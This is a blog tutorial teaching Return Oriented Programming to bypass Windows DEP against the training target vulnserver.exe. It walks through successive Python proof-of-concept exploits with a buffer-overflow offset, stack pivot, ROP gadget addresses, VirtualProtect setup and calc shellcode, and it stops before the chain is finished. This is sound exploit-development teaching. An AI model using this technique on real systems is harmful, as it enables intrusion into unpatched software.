---
title:  "Hands Up! Give Us the Stack! This Is a ROPpery!"
date:   2019-09-21
tags: [posts]
excerpt: "An introduction to utilizing Return Oriented Progamming to defeat Data Execution Prevention (DEP)"
---
Introduction
---
Over the years, the security community as a whole realized that there needed to be a way to stop exploit developers from easily executing malicious shellcode. Microsoft, over time, has implemented a plethora of intense exploit mitigations, such as: [EMET (the Enhanced Mitigation Experience Toolkit)](https://support.microsoft.com/en-us/help/2458544/the-enhanced-mitigation-experience-toolkit), [CFG (Control Flow Guard)](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard), [Windows Defender Exploit Guard](https://www.microsoft.com/security/blog/2017/10/23/windows-defender-exploit-guard-reduce-the-attack-surface-against-next-generation-malware/), and [ASLR (Address Space Layout Randomization)](https://docs.microsoft.com/en-us/cpp/build/reference/dynamicbase-use-address-space-layout-randomization?view=vs-2019).

[DEP](https://support.microsoft.com/en-us/help/875352/a-detailed-description-of-the-data-execution-prevention-dep-feature-in), or Data Execution Prevention, is another one of those roadblocks that hinders exploit developers. This blog post will only focusing on defeating DEP, within a stack based data structure on Windows. 

A Brief Word About DEP
---
Windows XP SP2 32 bit was the first Windows operating system to ship DEP. Every version of Windows since then has included DEP. DEP, at a high level, gives memory two independent permission levels. They are:
- The ability to write to memory.

  __OR__

- The ability to execute memory.

But not both.

What this means, is that someone cannot write ___AND___ execute memory at the same time. This means a few things for exploit developers. Let's say you have a simple vanilla stack instruction pointer overwrite. Let's also say the first byte, and all of the following bytes of your payload, are pointed to by the stack pointer. Normally, a simple `jmp stack pointer` instruction would suffice- and it would rain shells. With DEP, it is not that simple. Since that shellcode is user introduced shellcode- you will be able to write to the stack. BUT, as soon as any execution of that user supplied shellcode is attempted- an access violation will occur, and the application will terminate.

DEP manifests itself in four different policy settings. From the MSDN documentation on DEP, here are the four policy settings:

<img src="{{ site.url }}{{ site.baseurl }}/images/DEP1.PNG" alt="">

Knowing the applicable information on how DEP is implemented, figuring how to defeat DEP is the next viable step.

Windows API, We Meet Again
---

In my [last post](https://connormcgarr.github.io/WS32_recv()-Reuse/), I explained and outlined how powerful the Windows API is. Microsoft has released all of the [documentation](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list) ono the Windows API, which aids in reverse engineering the parameters needed for API function calls.

Defeating DEP is no different. There are many API functions that can be used to defeat DEP. A few of them include:
- __[VirtualProtect()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)__
- __[VirtualAlloc()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)__
- __[WriteProcessMemory()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)__
- __[HeapCreate()](https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate)__

But the only limitation to defeating DEP, is the number of applicable APIs in Windows that change the permissions of the memory containing shellcode.

For this post, `VirtualProtect()` will be the Windows API function used for bypassing DEP.

`VirtualProtect` takes the following parameters:
```c
BOOL VirtualProtect(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
);
```

`lpAddress` = A pointer an address that describes the starting page of the region of pages whose access protection attributes are to be changed.

`dwSize` = The size of the region whose access protection attributes are to be changed, in bytes.

`flNewProtect` = The memory protection option. This parameter can be one of the memory protection constants. (`0x40` sets the permissions of the memory page to read, write, and execute.)

`lpflOldProtect` = A pointer to a variable that receives the previous access protection value of the first page in the specified region of pages. (This should be any address that already has write permissions.)

Now this is all great and fine, but there is a question one should be asking themselves. If it is not possible to write the parameters to the stack and also execute them, how will the function get ran?

Let's ROP!
---
This is where Return Oriented Programming comes in. Even when DEP is enabled, it is still possible to perform operations on the stack such as `push`, `pop`, `add`, `sub`, etc.

"How is that so? I thought it was not possible to write and execute on the stack?" This is a question you also may be having. The way ROP works, is by utilizing pointers to instructions that already exist within an application.

Let's say there's an application called __vulnserver.exe__. Let's say there is a memory address of `0xDEADBEEF` that when viewed, contains the instruction `add esp, 0x100`. If this memory address got loaded into the instruction pointer, it would execute the command it points to. But nothing user supplied was written to the stack.

What this means for exploit developers, is this. If one is able to chain a set of memory addresses together, that all point to useful instructions already existing in an application/system- it might be possible to change the permissions of the memory pages containing malicious shellcode. Let's get into how this looks from a practicality/hands-on approach.

If you would like to follow along, I will be developing this exploit on a 32 bit Windows 7 virtual machine with ASLR disabled. The application I will be utilizing is [vulnserver.exe](https://github.com/stephenbradshaw/vulnserver).

A Brief Introduction to ROP Gadgets and ROP Chains
---

The reason why ROP is called Return Oriented Programming, is because each instruction is always followed by a `ret` instruction. Each `ASM + ret` instruction is known as a ROP gadget. Whenever these gadgets are loaded consecutively one after the other, this is known as a ROP chain.

The `ret` is probably the most important part of the chain. The reason the return instruction is needed is simple. Let's say you own the stack. Let's say you are able to load your whole ROP chain onto the stack. How would you execute it?

Enter `ret`. A return instruction simply takes whatever is located in the stack pointer (on top of the stack) and loads it into the instruction pointer (what is currently being executed). Since the ROP chain is located on the stack and a ROP chain is simply a bunch of memory addresses, the `ret` instruction will simply return to the stack, pick up the next memory address (ROP gadget), and execute it. This will keep happening, until there are no more left! This makes life a bit easier.

POC
---

Enough jibber jabber- here is the POC for `vulnserver.exe`:
```python
import struct
import sys
import os
import socket

# Vulnerable command
command = "TRUN ."

# 2006 byte offset to EIP
crash = "\x41" * 2006

# Stack Pivot (returning to the stack without a jmp/call)
crash += struct.pack('<L', 0x62501022)    # ret essfunc.dll

# 5000 byte total crash
filler = "\x43" * (5000-len(command)-len(crash))
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.235.130", 9999))
s.send(command+crash+filler)
s.close()
```

..But ...But What About Jumping to ESP?
---

There will not be a `jmp esp` instruction here. Remember, with DEP- this will kill the exploit. Instead, you'll need to find any memory address that contains a `ret` instruction. As outlined as above, this will directly take us back to the stack. This is normally called a _stack pivot_.

Where Art Thou ROP Gadgets?
---

The tool that will be used to find ROP gadgets is [rp++](https://github.com/0vercl0k/rp/downloads). Some other options are to use [mona.py](https://github.com/corelan/mona) or to search manually. To search manually all one would need to do is locate all instances of `ret` and look at the above instructions to see if there is anything useful. Mona will also construct a ROP chain for you that can be used to defeat DEP. This is not the point of this post. The point of this post, is that we are going to manually ROP the `vulnserver.exe` program. Only by manually doing something first, are you able to learn.

Here are all of the dependencies that make up `vulnserver.exe`. Execute the following `mona.py` command in [Immunity Debugger](https://debugger.immunityinc.com/ID_register.py):

`!mona modules`:

<img src="{{ site.url }}{{ site.baseurl }}/images/DEP2.PNG" alt="">

Next, us `rp++` to enumerate all useful ROP gadgets for all of the dependencies. Here is an example for `vulnserver.exe`. Run `rp++` for each dependency:

<img src="{{ site.url }}{{ site.baseurl }}/images/DEP3.PNG" alt="">

The `-f` options specifies the file. The `-r` option specifies maximum number of instructions the ROP gadgets can contain (5 in our case).

After this, the POC needs to be updated. The update is going to reserve a place on the stack for the API call to the function `VirtualProtect()`. I found the address of `VirtualProtect()` to be at address `0x77e22e15`. Remember, in this test environment- ASLR is disabled.

To find the address of `VirtualProtect` on your machine, to to Immunity and double-clik on any instruction in the disassembly window and enter 

`call kernel32.VirtualProtect`:

<img src="{{ site.url }}{{ site.baseurl }}/images/DEP4.PNG" alt="">

After this, double click on the same instruction again, to see the address of where the  call is happening, which is `kernel32.VirtualProtect` in this case. Here, you can see the address I referenced earlier:

<img src="{{ site.url }}{{ site.baseurl }}/images/DEP5.PNG" alt="">

Also, you need to find a `flOldProtect` address. You can literally place any address in this parameter, that contains writeable permissions.

Now the POC can be updated:

```python
import struct
import sys
import os
import socket

# Vulnerable command
command = "TRUN ."

# 2006 byte offset to EIP
crash = "\x41" * 2006

# Stack Pivot (returning to the stack without a jmp/call)
crash += struct.pack('<L', 0x62501022)    # ret essfunc.dll

# Calling VirtualProtect with parameters
parameters = struct.pack('<L', 0x77e22e15)    # kernel32.VirtualProtect()
parameters += struct.pack('<L', 0x4c4c4c4c)    # return address (address of shellcode, or where to jump after VirtualProtect call. Not officially apart of the "parameters"
parameters += struct.pack('<L', 0x45454545)    # lpAddress
parameters += struct.pack('<L', 0x03030303)    # size of shellcode
parameters += struct.pack('<L', 0x54545454)    # flNewProtect
parameters += struct.pack('<L', 0x62506060)    # pOldProtect (any writeable address)

# Padding between future ROP Gadgets and shellcode. Arbitrary number (just make sure you have enough room on the stack)
padding = "\x90" * 250

# calc.exe POC payload created with the Windows API system() function.
# You can replace this with an msfvenom payload if you would like
shellcode = "\x31\xc0\x50\x68"
shellcode += "\x63\x61\x6c\x63"
shellcode += "\x54\xbe\x77\xb1"
shellcode += "\xfa\x6f\xff\xd6"

# 5000 byte total crash
filler = "\x43" * (5000-len(command)-len(crash)-len(parameters)-len(padding)-len(rop))
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.148", 9999))
s.send(command+crash+rop+parameters+padding+filler)
s.close()
```

Before moving on, you may have noticed an arbitrary `parameter` variable added into the POC. These are not apart of the official parameters for `VirtualProtect()`. The reason this address is there (and right under the `VirtualProtect()` function is because whenever the call to teh function occurs, there needs to be a way to execute our shellcode. The address of `return` is going to contain the address of the shellcode- so the application will jump straight to the user supplied shellcode. The location of the shellcode will be marked as read, write, and execute.

One last thing. The reason we are adding the shellcode now, is because of one of the properties of DEP. The shellcode will not be executed until we change the permissions of DEP. It is written in advance because DEP will allow us to write to the stack, so long as we are not executing.

Set a breakpoint at the address `0x62501022` and execute the updated POC. Step through the breakpoint with `F7` in Immunity and take a look at the state of the stack:

<img src="{{ site.url }}{{ site.baseurl }}/images/DEP6.PNG" alt="">

Recall that the Windows API, when called, takes the items on the top of the stack (the stack pointer) as the parameters. That is why the items in the POC under the `VirtualProtect()` call are seen in the function call (because after EIP all of the supplied data is on the stack).

As you can see, all of the parameters are there. Here, at a high level, is we are going to change these parameters.

It is pretty much guarenteed that there is no way we will find five ROP gadgets that EXACTLY equal the values we need. Knowing this, we have to be more creative with out ROP gadgets and how we go about manipulating the stack to do what we need- which is change what values the current placeholders contain.

Instead, what we will do is put the values needed into a register, and then change the placeholders we currently have, to point to the values in the registers. An example would be, we could get the value for `lpAddress` into a register. Then, using ROP, we could make the current placeholder for `lpAddress` point to that register, where the intended value (real value) of `lpAddress` is.

Again, this is all very high level. Let's get into some of the more low level details.

Hey, Stack Pointer- Stay Right There. BRB.
---

The first thing we need to do is save our current stack pointer. Taking a look at the current state of the registers, that seems to be `0x018DF9E4`:

<img src="{{ site.url }}{{ site.baseurl }}/images/DEP7.png" alt="">

As you will see later on- it is always best to try to save the stack pointer in multiple registers (if possible).
The reason for this is simple. The current stack pointer is going to contain an address that is near and around a couple of things: the `VirtualProtect()` function call and the parameters, as well as our shellcode.

When it comes to exploitation, you never know what the state of the registers could be when you gain control of an application. Placing the current stack pointer into some of the registers allows us to easily be able to make calculations on different things on and around the stack area. If EAX, for example, has a value of `0x00000001` at the time of the crash, but you need a value of `0x12345678` in EAX, it is going to be VERY hard to keep adding to EAX to get the intended value. BUt if the stack pointer is equal to `0x12345670` at the time of the crash, it is much easier to make calculations, if that value is in EAX to begin with.

Time to break out all of the ROP gadgets we found earlier. It seems as though there are two great options for saving the state of the current stack pointer:

```
0x77bf58d2: push esp ; pop ecx ; ret  ;  RPCRT4.dll

0x77e4a5e6: mov eax, ecx ; ret  ;  user32.dll
```

The first ROP gadget will push the value of the stack pointer onto the stack. It will then pop it into ECX- meaning ECX now contains the value of the current stack pointer. The second ROP gadget will move the value of ECX into EAX. At this point, ECX and EAX both contain the current ESP value. 

These ROP gadgets will be placed ABOVE the current parameters. The reason is, that these are vital in our calculation process. We are essentially priming the registers before we begin trying to get our intended values into the parameter placeholders. It makes it easier to do this before the `VirtualProtect()` call is made.

The updated POC:

```python
import struct
import sys
import os
import socket

# Vulnerable command
command = "TRUN ."

# 2006 byte offset to EIP
crash = "\x41" * 2006

# Stack Pivot (returning to the stack without a jmp/call)
crash += struct.pack('<L', 0x62501022)    # ret essfunc.dll

# Beginning of ROP chain

# Saving ESP into ECX and EAX
rop = struct.pack('<L', 0x77bf58d2)  # 0x77bf58d2: push esp ; pop ecx ; ret  ;  (1 found)
rop += struct.pack('<L', 0x77e4a5e6) # 0x77e4a5e6: mov eax, ecx ; ret  ;  (1 found)

# Calling VirtualProtect with parameters
parameters = struct.pack('<L', 0x77e22e15)    # kernel32.VirtualProtect()
parameters += struct.pack('<L', 0x4c4c4c4c)    # return address (address of shellcode, or where to jump after VirtualProtect call. Not officially apart of the "parameters"
parameters += struct.pack('<L', 0x45454545)    # lpAddress
parameters += struct.pack('<L', 0x03030303)    # size of shellcode
parameters += struct.pack('<L', 0x54545454)    # flNewProtect
parameters += struct.pack('<L', 0x62506060)    # pOldProtect (any writeable address)

# Padding between ROP Gadgets and shellcode. Arbitrary number (just make sure you have enough room on the stack)
padding = "\x90" * 250

# calc.exe POC payload created with the Windows API system() function.
# You can replace this with an msfvenom payload if you would like
shellcode = "\x31\xc0\x50\x68"
shellcode += "\x63\x61\x6c\x63"
shellcode += "\x54\xbe\x77\xb1"
shellcode += "\xfa\x6f\xff\xd6"

# 5000 byte total crash
filler = "\x43" * (5000-len(command)-len(crash)-len(parameters)-len(padding)-len(rop))
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.148", 9999))
s.send(command+crash+rop+parameters+padding+filler)
s.close()
```

The state of the registers after the two ROP gadgets (remember to place breakpoint on the stack pivot `ret` instruction and step through with `F7` in each debugging step):

<img src="{{ site.url }}{{ site.baseurl }}/images/DEP8.png" alt="">

As you can see from the POC above, the parameters to `VirtualProtect` are next up on the stack after the first two ROP gadgets are executed. Since we do not want to overwrite those parameters, we simply would like to "jump" over them for now. To do this, we can simply add to the current value of ESP, with an `add esp, VALUE + ret` ROP gadget. This will change the value of ESP to be a greater value than the current stack pointer (which currently contains the call to `VirtualProtect()`). This means we will be farther down in the stack (past the `VirtualProtect()` call). Since all of our ROP gadgets are ending with a `ret`, the new stack pointer (which is greater) will be loaded into EIP, because of the `ret` instruction in the `add esp, VALUE + ret`. This will make more sense in the screenshots that will be outlined below showing the execution of the ROP gadget.

Again, looking through the gadgets created earlier, here is a viable one:

```
0x6ff821d5: add esp, 0x1C ; ret  ;  USP10.dll
```

The updated POC:
```python
import struct
import sys
import os
import socket

# Vulnerable command
command = "TRUN ."

# 2006 byte offset to EIP
crash = "\x41" * 2006

# Stack Pivot (returning to the stack without a jmp/call)
crash += struct.pack('<L', 0x62501022)    # ret essfunc.dll

# Beginning of ROP chain

# Saving ESP into ECX and EAX
rop = struct.pack('<L', 0x77bf58d2)  # 0x77bf58d2: push esp ; pop ecx ; ret  ;  (1 found)
rop += struct.pack('<L', 0x77e4a5e6) # 0x77e4a5e6: mov eax, ecx ; ret  ;  (1 found)

# Jump over parameters
rop += struct.pack('<L', 0x6ff821d5) # 0x6ff821d5: add esp, 0x1C ; ret  ;  (1 found)

# Stack Pivot (returning to the stack without a jmp/call)
crash += struct.pack('<L', 0x62501022)    # ret essfunc.dll

# Calling VirtualProtect with parameters
parameters = struct.pack('<L', 0x77e22e15)    # kernel32.VirtualProtect()
parameters += struct.pack('<L', 0x4c4c4c4c)    # return address (address of shellcode, or where to jump after VirtualProtect call. Not officially apart of the "parameters"
parameters += struct.pack('<L', 0x45454545)    # lpAddress
parameters += struct.pack('<L', 0x03030303)    # size of shellcode
parameters += struct.pack('<L', 0x54545454)    # flNewProtect
parameters += struct.pack('<L', 0x62506060)    # pOldProtect (any writeable address)

# Padding between ROP Gadgets and shellcode. Arbitrary number (just make sure you have enough room on the stack)
padding = "\x90" * 250

# calc.exe POC payload created with the Windows API system() function.
# You can replace this with an msfvenom payload if you would like
shellcode = "\x31\xc0\x50\x68"
shellcode += "\x63\x61\x6c\x63"
shellcode += "\x54\xbe\x77\xb1"
shellcode += "\xfa\x6f\xff\xd6"

# 5000 byte total crash
filler = "\x43" * (5000-len(command)-len(crash)-len(parameters)-len(padding)-len(rop))
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.148", 9999))
s.send(command+crash+rop+parameters+padding+filler)
s.close()
```

The stack pointer before execution of the latest ROP gadget is `0x01A7F9F0`:

<img src="{{ site.url }}{{ site.baseurl }}/images/DEP9.png" alt="">


<img src="{{ site.url }}{{ site.baseurl }}/images/DEP10.png" alt="">

The stack pointer after execution of the `add esp, 0x1C` is `0x1A7FA0C`:

<img src="{{ site.url }}{{ site.baseurl }}/images/DEP11.png" alt="">


<img src="{{ site.url }}{{ site.baseurl }}/images/DEP12.png" alt="">

Now that the stack pointer has been raised to "jump" over the `VirtualProtect()` parameters, the second half of the ROP gadget, containing `ret` will simply take the current stack pointer, `0x1A7FA0C`, and place it into EIP.

The current state of the registers and stack after the execution of all current ROP chains:

<img src="{{ site.url }}{{ site.baseurl }}/images/DEP13.png" alt="">


<img src="{{ site.url }}{{ site.baseurl }}/images/DEP14.png" alt="">

As you can see from the above image, EIP has been filled with NOPs. When we added `0x1C` to ESP, it made ESP point to our NOPs. When the `ret` issued, it loaded the stack pointer (which contained NOPs) into EIP! We have successfully jumped over our `VirtualProtect()` parameters.
